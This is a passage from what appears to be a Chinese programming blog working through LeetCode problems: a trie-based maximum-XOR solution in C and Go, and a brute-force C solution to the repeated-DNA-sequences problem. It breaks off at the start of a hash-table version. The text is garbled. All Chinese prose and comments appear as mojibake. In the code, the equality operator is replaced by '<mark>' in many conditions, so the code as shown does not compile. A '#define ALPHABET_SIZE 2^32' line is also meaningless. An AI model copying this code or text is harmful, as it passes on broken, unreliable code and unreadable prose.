çš„å­èŠ‚ç‚¹èµ°ï¼Œx çš„ç¬¬ k ä¸ªäºŒè¿›åˆ¶ä½ä¸º 0ã€‚</p><p>å½“éå†å®Œæ‰€æœ‰çš„ 31 ä¸ªäºŒè¿›åˆ¶ä½åï¼Œæˆ‘ä»¬ä¹Ÿå°±å¾—åˆ°äº† ai å¯ä»¥é€šè¿‡å¼‚æˆ–è¿ç®—å¾—åˆ°çš„æœ€å¤§ xã€‚è¿™æ ·ä¸€æ¥ï¼Œå¦‚æœæˆ‘ä»¬æšä¸¾äº†æ‰€æœ‰çš„ aiï¼Œä¹Ÿå°±å¾—åˆ°äº†æœ€ç»ˆçš„ç­”æ¡ˆã€‚</p><p>ç»†èŠ‚</p><p>ç”±äºå­—å…¸æ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šåªæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œåˆ†åˆ«è¡¨ç¤º 0 å’Œ 1ï¼Œå› æ­¤æœ¬é¢˜ä¸­çš„å­—å…¸æ ‘æ˜¯ä¸€æ£µäºŒå‰æ ‘ã€‚åœ¨è®¾è®¡å­—å…¸æ ‘çš„æ•°æ®ç»“æ„æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä»¤å·¦å­èŠ‚ç‚¹ leftè¡¨ç¤º 0ï¼Œå³å­èŠ‚ç‚¹ rightè¡¨ç¤º 1ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALPHABET_SIZE 2^32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é¦–å…ˆæ„é€ Trieæ ‘ï¼ŒæŠŠNä¸ªæ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ’å…¥åˆ°Trieæ ‘ä¸­</span></span><br><span class="line"><span class="comment"> * ç„¶åä»é«˜åˆ°ä½ä½¿ç”¨è´ªå¿ƒç®—æ³•ï¼ŒéªŒè¯æ¯ä¸€ä½æ˜¯å¦å­˜åœ¨ä¸¤ä¸ªå‰ç¼€ï¼Œä½¿å¾—è¿™ä¸¤ä¸ªå‰ç¼€å¼‚æˆ–çš„ç»“æœçš„è¯¥ä½ä¸º1</span></span><br><span class="line"><span class="comment"> * æœ€åæŠŠå¾—åˆ°çš„æœ€å¤§å€¼è¿”å›å³å¯</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Trie tree</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">child</span>[2];</span> <span class="comment">// 0 å’Œ 1 ä¸¤ä¸ªå­èŠ‚ç‚¹</span></span><br><span class="line">&#125; TrieNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create new Trie node and init</span></span><br><span class="line">TrieNode* <span class="title function_">createTrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">    TrieNode* node = (TrieNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TrieNode));</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        node-&gt;child[<span class="number">0</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        node-&gt;child[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert nums to Trie tree</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(TrieNode* root, <span class="type">int</span> nums)</span> &#123;</span><br><span class="line">    <span class="comment">//struct TrieNode* root = createTrieNode();</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">31</span>;i&gt;=<span class="number">0</span>;i--) &#123;</span><br><span class="line">        <span class="type">int</span> index = (nums&gt;&gt;i)&amp;<span class="number">1</span>; <span class="comment">//å–å‡ºç¬¬iä½äºŒè¿›åˆ¶æ•°</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;child[index] &lt;mark&gt; <span class="literal">NULL</span>) &#123;</span><br><span class="line">            node-&gt;child[index] = createTrieNode();<span class="comment">//ä¾‹å¦‚child[0]=0; æˆ–è€…child[1]=1;å¦åˆ™ä¸ºNULL</span></span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;child[index];   <span class="comment">//ç§»åˆ°ä¸‹ä¸€ä½</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Find Max XOR   </span></span><br><span class="line"><span class="comment">//è¿™æ˜¯åœ¨æ±‚æ”¾è¿›iä¸ªæ•°å­—è¿›å­—å…¸æ ‘ä¹‹åï¼Œå½“å‰æ‰€æœ‰æ ‘ä¸­å¼‚æˆ–å€¼æœ€å¤§çš„å€¼ã€‚</span></span><br><span class="line"><span class="comment">//æ—¶é—´å¤æ‚åº¦å‡å°‘çš„åŸå› å°±æ˜¯æŸ¥æ‰¾aiå¯¹åº”çš„æœ€å¤§å¼‚æˆ–å€¼çš„æ—¶å€™ä¸æ˜¯æ¯ä¸€ä¸ªå»æ±‚å¼‚æˆ–ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡äºŒè¿›åˆ¶ä½æ¥æ‰¾</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">findMaxXOR</span><span class="params">(TrieNode* root,<span class="type">int</span> num)</span> &#123;</span><br><span class="line">    TrieNode* node = root;     <span class="comment">//æ­¤æ—¶çš„nodeæ˜¯é‚£ä¸ªå­—å…¸æ ‘ï¼Œnumå°±æ˜¯æˆ‘ä»¬çš„ai</span></span><br><span class="line">    <span class="type">int</span> maxXOR = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">    <span class="type">int</span> bit = (num &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> complement = <span class="number">1</span> - bit;</span><br><span class="line">    <span class="keyword">if</span> (node-&gt;child[complement]) &#123;</span><br><span class="line">            maxXOR |= (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            node = node-&gt;child[complement];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node = node-&gt;child[bit];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxXOR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Find Maxnum uses Greedy Algorithm</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">findMaximumXOR</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    TrieNode* root = createTrieNode();</span><br><span class="line">    <span class="type">int</span> maxXOR = <span class="number">0</span>, currentXOR = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++) &#123;</span><br><span class="line">    insert(root,nums[i]);</span><br><span class="line">    currentXOR = findMaxXOR(root, nums[i]); <span class="comment">//æ‰¾åˆ°aiå’Œå‰é¢çš„æ•°ç»„åˆä¸­çš„æœ€å¤§å¼‚æˆ–å€¼ï¼Œéå†å®Œä¹‹åæœ€å¤§çš„å°±æ˜¯æ•´ä¸ªç»„åˆä¸­æœ€å¤§çš„ã€‚</span></span><br><span class="line">    maxXOR = (currentXOR &gt; maxXOR) ? currentXOR : maxXOR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxXOR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> nums[] = &#123;<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="type">int</span> numsSize = <span class="keyword">sizeof</span>(nums)/<span class="keyword">sizeof</span>(nums[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> max =  findMaximumXOR(nums, numsSize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h5><h6 id="å­—å…¸æ ‘-1"><a href="#å­—å…¸æ ‘-1" class="headerlink" title="å­—å…¸æ ‘"></a>å­—å…¸æ ‘</h6><p>å…ˆæŠ„ä¸€ä¸‹leetcodeå®˜æ–¹é¢˜è§£</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* ä½œè€…ï¼šåŠ›æ‰£å®˜æ–¹é¢˜è§£</span></span><br><span class="line"><span class="comment">* é“¾æ¥ï¼šhttps://leetcode.cn/problems/maximum-xor-of-two-numbers-in-an-array/solutions/778291/shu-zu-zhong-liang-ge-shu-de-zui-da-yi-h-n9m9/</span></span><br><span class="line"><span class="comment">* æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰</span></span><br><span class="line"><span class="comment">* è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> trie <span class="keyword">struct</span> &#123;</span><br><span class="line">left, right *trie</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *trie)</span></span> add(num <span class="type">int</span>) &#123;</span><br><span class="line">cur := t</span><br><span class="line"><span class="keyword">for</span> i := highBit; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">bit := num &gt;&gt; i &amp; <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> bit &lt;mark&gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">if</span> cur.left &lt;mark&gt; <span class="literal">nil</span> &#123;</span><br><span class="line">cur.left = &amp;trie&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">cur = cur.left</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> cur.right &lt;mark&gt; <span class="literal">nil</span> &#123;</span><br><span class="line">cur.right = &amp;trie&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">cur = cur.right</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *trie)</span></span> check(num <span class="type">int</span>) (x <span class="type">int</span>) &#123;</span><br><span class="line">cur := t</span><br><span class="line"><span class="keyword">for</span> i := highBit; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">bit := num &gt;&gt; i &amp; <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> bit &lt;mark&gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// a_i çš„ç¬¬ k ä¸ªäºŒè¿›åˆ¶ä½ä¸º 0ï¼Œåº”å½“å¾€è¡¨ç¤º 1 çš„å­èŠ‚ç‚¹ right èµ°</span></span><br><span class="line"><span class="keyword">if</span> cur.right != <span class="literal">nil</span> &#123;</span><br><span class="line">cur = cur.right</span><br><span class="line">x = x*<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cur = cur.left</span><br><span class="line">x = x * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// a_i çš„ç¬¬ k ä¸ªäºŒè¿›åˆ¶ä½ä¸º 1ï¼Œåº”å½“å¾€è¡¨ç¤º 0 çš„å­èŠ‚ç‚¹ left èµ°</span></span><br><span class="line"><span class="keyword">if</span> cur.left != <span class="literal">nil</span> &#123;</span><br><span class="line">cur = cur.left</span><br><span class="line">x = x*<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cur = cur.right</span><br><span class="line">x = x * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findMaximumXOR</span><span class="params">(nums []<span class="type">int</span>)</span></span> (x <span class="type">int</span>) &#123;</span><br><span class="line">root := &amp;trie&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line"><span class="comment">// å°† nums[i-1] æ”¾å…¥å­—å…¸æ ‘ï¼Œæ­¤æ—¶ nums[0 .. i-1] éƒ½åœ¨å­—å…¸æ ‘ä¸­</span></span><br><span class="line">root.add(nums[i<span class="number">-1</span>])</span><br><span class="line"><span class="comment">// å°† nums[i] çœ‹ä½œ aiï¼Œæ‰¾å‡ºæœ€å¤§çš„ x æ›´æ–°ç­”æ¡ˆ</span></span><br><span class="line">x = max(x, root.check(nums[i]))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="DAY4-187-é‡å¤çš„DNAåºåˆ—"><a href="#DAY4-187-é‡å¤çš„DNAåºåˆ—" class="headerlink" title="DAY4-187.é‡å¤çš„DNAåºåˆ—"></a>DAY4-187.é‡å¤çš„DNAåºåˆ—</h4><p><a href="https://leetcode.cn/problems/repeated-dna-sequences/">187. é‡å¤çš„DNAåºåˆ—</a></p><h6 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h6><p><mark>ä¸­ç­‰<mark></p><blockquote><p><strong>DNAåºåˆ—</strong> ç”±ä¸€ç³»åˆ—æ ¸è‹·é…¸ç»„æˆï¼Œç¼©å†™ä¸º <code>&#39;A&#39;</code>, <code>&#39;C&#39;</code>, <code>&#39;G&#39;</code> å’Œ <code>&#39;T&#39;</code>.ã€‚</p><ul><li>ä¾‹å¦‚ï¼Œ<code>&quot;ACGAATTCCG&quot;</code> æ˜¯ä¸€ä¸ª <strong>DNAåºåˆ—</strong> ã€‚</li></ul><p>åœ¨ç ”ç©¶ <strong>DNA</strong> æ—¶ï¼Œè¯†åˆ« DNA ä¸­çš„é‡å¤åºåˆ—éå¸¸æœ‰ç”¨ã€‚</p><p>ç»™å®šä¸€ä¸ªè¡¨ç¤º <strong>DNAåºåˆ—</strong> çš„å­—ç¬¦ä¸² <code>s</code> ï¼Œè¿”å›æ‰€æœ‰åœ¨ DNA åˆ†å­ä¸­å‡ºç°ä¸æ­¢ä¸€æ¬¡çš„ <strong>é•¿åº¦ä¸º <code>10</code></strong> çš„åºåˆ—(å­å­—ç¬¦ä¸²)ã€‚ä½ å¯ä»¥æŒ‰ <strong>ä»»æ„é¡ºåº</strong> è¿”å›ç­”æ¡ˆã€‚</p><p> <strong>ç¤ºä¾‹ 1ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT&quot;</span><br><span class="line">è¾“å‡ºï¼š[&quot;AAAAACCCCC&quot;,&quot;CCCCCAAAAA&quot;]</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;AAAAAAAAAAAAA&quot;</span><br><span class="line">è¾“å‡ºï¼š[&quot;AAAAAAAAAA&quot;]</span><br></pre></td></tr></table></figure><p><strong>æç¤ºï¼š</strong></p><ul><li><code>0 &lt;= s.length &lt;= 105</code></li><li><code>s[i]``&lt;mark&gt;``&#39;A&#39;</code>ã€<code>&#39;C&#39;</code>ã€<code>&#39;G&#39;</code> or <code>&#39;T&#39;</code></li></ul></blockquote><h6 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h6><ul><li>å“ˆå¸Œè¡¨æŸ¥æ‰¾</li><li>æ•°ç»„æŸ¥æ‰¾</li></ul><h5 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h5><ul><li>åˆ›å»ºæ•°ç»„<code>a[len-9][]</code>ï¼Œå­˜æ”¾é•¿åº¦ä¸º10çš„å­—ä¸²<ul><li>i&#x3D;0åˆ°i&#x3D;len-10</li><li><code>a[i][j]</code>&#x3D;<code>s[j]</code></li></ul></li><li>æŸ¥æ‰¾ç›¸åŒçš„ä¸²ï¼Œ<code>a[i][j]=a[k][j]</code>è¾“å‡º</li></ul><h5 id="Cè¯­è¨€-2"><a href="#Cè¯­è¨€-2" class="headerlink" title="Cè¯­è¨€"></a>Cè¯­è¨€</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>** <span class="title function_">findRepeatedDnaSequences</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="type">int</span> len1 = len<span class="number">-9</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">char</span> (*a)[<span class="number">11</span>] = <span class="built_in">malloc</span>(len1 * <span class="keyword">sizeof</span>(*a));</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;len1;i++)&#123;</span><br><span class="line">                <span class="built_in">strncpy</span>(a[i], s + i, <span class="number">10</span>);</span><br><span class="line">                a[i][<span class="number">10</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="type">int</span>* count = <span class="built_in">malloc</span>(len1 * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">            <span class="built_in">memset</span>(count, <span class="number">0</span>, len1 * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len1; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; len1; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(a[i], a[j]) &lt;mark&gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        count[i]++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">char</span>** result = <span class="built_in">malloc</span>(len1 * <span class="keyword">sizeof</span>(*result));</span><br><span class="line">            *returnSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len1; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (count[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="type">int</span> duplicate = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; *returnSize; k++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(result[k], a[i]) &lt;mark&gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            duplicate = <span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!duplicate) &#123;</span><br><span class="line">                        result[*returnSize] = <span class="built_in">malloc</span>(<span class="number">11</span>);  </span><br><span class="line">                        <span class="built_in">strcpy</span>(result[*returnSize], a[i]);</span><br><span class="line">                        (*returnSize)++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">        <span class="built_in">free</span>(count);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜ï¼š</p><ul><li>è¶…æ—¶äº†</li><li>å¢åŠ äº†<code>duplicate</code>æ˜¯ä¸ºäº†é˜²æ­¢ç›¸åŒçš„å†…å®¹è¾“å‡ºå¤šæ¬¡</li><li>ä¸€å¼€å§‹çš„äºŒç»´æ•°ç»„æ”¹æˆäº†åŠ¨æ€å†…å­˜åˆ›å»ºæ•°ç»„ï¼ŒèŠ‚çœç©ºé—´ã€‚</li><li>ç”¨å­—ç¬¦ä¸²æ¯”è¾ƒå’Œèµ‹å€¼ç­‰å‡½æ•°ï¼š<code>strncpy</code>ï¼Œ<code>strcmp</code>æ›´æ–¹ä¾¿</li></ul><h6 id="hashè¡¨ä¼˜åŒ–"><a href="#hashè¡¨ä¼˜åŒ–" class="headerlink" title="hashè¡¨ä¼˜åŒ–"></a>hashè¡¨ä¼˜åŒ–</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 